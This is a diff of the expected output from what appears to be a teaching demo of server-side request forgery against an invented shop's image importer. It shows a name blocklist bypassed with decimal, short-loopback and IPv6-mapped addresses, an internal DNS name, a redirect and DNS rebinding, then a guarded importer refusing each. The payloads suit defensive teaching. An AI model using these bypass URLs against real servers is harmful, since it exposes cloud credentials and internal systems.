@@ -1,35 +1,134 @@
-== 1. Importing an image from a web address ==
-honest address                  -> imported: PNG-cat
-
-== 2. The server fetches whatever it is told ==
-metadata address                -> imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
-localhost                       -> imported: DB_PASSWORD=demo-not-real
-office admin page               -> imported: internal admin panel: 3 customers
-
-== 3. A blocklist of names is easy to walk around ==
-metadata address                -> refused: blocked host name 169.254.169.254
-decimal spelling                -> imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
-short loopback                  -> imported: DB_PASSWORD=demo-not-real
-mapped IPv6 spelling            -> imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
-name that points inside         -> imported: internal admin panel: 3 customers
-redirect from outside           -> imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
-
-== 4. Check the address the connection really uses ==
-honest address                  -> imported: PNG-cat
-metadata address                -> refused: 169.254.169.254 resolves to a private address 169.254.169.254
-decimal spelling                -> refused: 2852039166 resolves to a private address 169.254.169.254
-short loopback                  -> refused: 127.1 resolves to a private address 127.0.0.1
-mapped IPv6 spelling            -> refused: ::ffff:a9fe:a9fe resolves to a private address 169.254.169.254
-name that points inside         -> refused: intranet.attacker.example resolves to a private address 10.0.0.5
-redirect from outside           -> refused: 169.254.169.254 resolves to a private address 169.254.169.254
-localhost                       -> refused: localhost resolves to a private address 127.0.0.1
-user info trick                 -> refused: user info in the address
-DNS rebinding (own image only)  -> imported: PNG-attacker-cat
-two answers, one private        -> refused: dual.attacker.example resolves to a private address 10.0.0.5
-
-== 5. Limits, and why checking and then connecting is not enough ==
-port 22                         -> refused: port 22 is not allowed
-a web page, not an image        -> refused: not an image (text/html)
-an answer of 5000 bytes         -> refused: larger than 1024 bytes
-an answer that takes 3 seconds  -> refused: no answer within 1500 ms
-check, then connect by name     -> imported: internal admin panel: 3 customers
+ONE. The shop's import form works.
+  THE INVENTED INTERNET (address, name, what answers):
+    203.0.113.10     images.example  a public image host
+    203.0.113.66     evil.example    the attacker's host
+    169.254.169.254  (no name)       cloud metadata service
+    127.0.0.1        localhost       the shop's settings
+    10.0.0.5         (no name)       office admin page
+  THE REQUEST (the staff form, posted to the shop):
+    POST /import
+    url=http%3A%2F%2Fimages.example%2Fcat.png
+  HOW THE FORM VALUE IS DECODED:
+    %2F is hex 2F = 47, the character '/'
+    %3A is hex 3A = 58, the character ':'
+    -> http://images.example/cat.png
+  HOW THE SHOP FETCHES IT (the importer's log):
+    look up images.example: [203.0.113.10]
+    GET /cat.png at 203.0.113.10, Host: images.example
+    200 image/png, 7 bytes
+  THE RESPONSE (status, then body):
+    200 imported: PNG-cat
+TWO. The server fetches whatever it is told.
+  THE REQUESTS (the url the form posts):
+    a  http://169.254.169.254/latest/meta-data/
+    b  http://localhost/
+    c  http://10.0.0.5/
+  THE RESPONSES (status, then body):
+    a  200 imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
+    b  200 imported: DB_PASSWORD=demo-not-real
+    c  200 imported: internal admin panel: 3 customers
+  HOW a WAS FETCHED (the importer's log):
+    look up 169.254.169.254: [169.254.169.254]
+    GET /latest/meta-data/ at 169.254.169.254, Host: 169.254.169.254
+    200 text/plain, 31 bytes
+THREE. A blocklist of names is easy to walk around.
+  THE BLOCKLIST (compared with the host, as text):
+    169.254.169.254, localhost, 127.0.0.1, 0.0.0.0
+  THE REQUESTS:
+    a  http://169.254.169.254/latest/meta-data/
+    b  http://2852039166/latest/meta-data/
+    c  http://127.1/
+    d  http://[::ffff:a9fe:a9fe]/latest/meta-data/
+    e  http://inside.evil.example/
+    f  http://evil.example/redirect
+  THE RESPONSES (status, then body):
+    a  400 refused: blocked host name 169.254.169.254
+    b  200 imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
+    c  200 imported: DB_PASSWORD=demo-not-real
+    d  200 imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
+    e  200 imported: internal admin panel: 3 customers
+    f  200 imported: AccessKeyId=DEMO-NOT-A-REAL-KEY
+  WHAT JAVA CONNECTS TO (the host as typed -> address):
+    b  2852039166          -> 169.254.169.254
+    c  127.1               -> 127.0.0.1
+    d  ::ffff:a9fe:a9fe    -> 169.254.169.254
+    e  inside.evil.example -> 10.0.0.5
+    f  evil.example        -> 203.0.113.66
+    then 302 redirect to 169.254.169.254: followed
+  HOW 2852039166 IS 169.254.169.254 (base 256):
+    169 x 16777216 = 2835349504
+    254 x 65536    =   16646144
+    169 x 256      =      43264
+    254 x 1        =        254
+    sum            = 2852039166
+FOUR. Check the address the connection really uses.
+  THE REQUEST (f, the redirect, again):
+    http://evil.example/redirect
+  THE CHECKS, AS THE IMPORTER LOGS THEM:
+    port 80, no user info: allowed
+    look up evil.example once: [203.0.113.66]
+    203.0.113.66 is public: connect to it
+    GET /redirect at 203.0.113.66, Host: evil.example
+    302 redirect to 169.254.169.254: check it again
+    port 80, no user info: allowed
+    look up 169.254.169.254 once: [169.254.169.254]
+    refused: 169.254.169.254 is not public
+  THE RESPONSE (status, then body):
+    400 refused: 169.254.169.254 is not public
+  THE REQUESTS:
+    a  http://images.example/cat.png
+    b  http://169.254.169.254/latest/meta-data/
+    c  http://2852039166/latest/meta-data/
+    d  http://127.1/
+    e  http://[::ffff:a9fe:a9fe]/latest/meta-data/
+    f  http://inside.evil.example/
+    g  http://localhost/
+    h  http://images.example@169.254.169.254/
+    i  http://dual.evil.example/cat.png
+  THE RESPONSES (status, then body):
+    a  200 imported: PNG-cat
+    b  400 refused: 169.254.169.254 is not public
+    c  400 refused: 2852039166 is 169.254.169.254, not public
+    d  400 refused: 127.1 is 127.0.0.1, not public
+    e  400 refused: ::ffff:a9fe:a9fe is 169.254.169.254, not public
+    f  400 refused: inside.evil.example is 10.0.0.5, not public
+    g  400 refused: localhost is 127.0.0.1, not public
+    h  400 refused: user info in the address
+    i  400 refused: dual.evil.example is 10.0.0.5, not public
+  ONE NAME, TWO ANSWERS (request i):
+    look up dual.evil.example once: [203.0.113.66, 10.0.0.5]
+    refused: dual.evil.example is 10.0.0.5, not public
+FIVE. Limits on what is fetched.
+  THE LIMITS (from the code):
+    port    80 or 443
+    type    image/...
+    size    at most 1024 bytes
+    time    an answer within 1500 ms
+  THE REQUESTS:
+    a  http://images.example:22/
+    b  http://evil.example/page.html
+    c  http://evil.example/big.png
+    d  http://evil.example/slow.png
+  THE RESPONSES (status, then body):
+    a  400 refused: port 22 is not allowed
+    b  400 refused: not an image (text/html)
+    c  400 refused: larger than 1024 bytes
+    d  400 refused: no answer within 1500 ms
+SIX. A second lookup can give a different answer.
+  THE REQUEST:
+    http://rebind.evil.example/cat.png
+  CHECK, THEN CONNECT BY NAME (the two-step importer's log):
+    check: look up rebind.evil.example: [203.0.113.66], public
+    look up rebind.evil.example: [10.0.0.5]
+    GET /cat.png at 10.0.0.5, Host: rebind.evil.example
+    200 text/plain, 33 bytes
+  THE RESPONSE:
+    200 imported: internal admin panel: 3 customers  <- NOT CHECKED
+  THE GUARDED IMPORTER (looks the name up once):
+    port 80, no user info: allowed
+    look up rebind.evil.example once: [203.0.113.66]
+    203.0.113.66 is public: connect to it
+    GET /cat.png at 203.0.113.66, Host: rebind.evil.example
+    200 image/png, 16 bytes: imported
+  THE RESPONSE:
+    200 imported: PNG-attacker-cat  <- NOTHING INSIDE
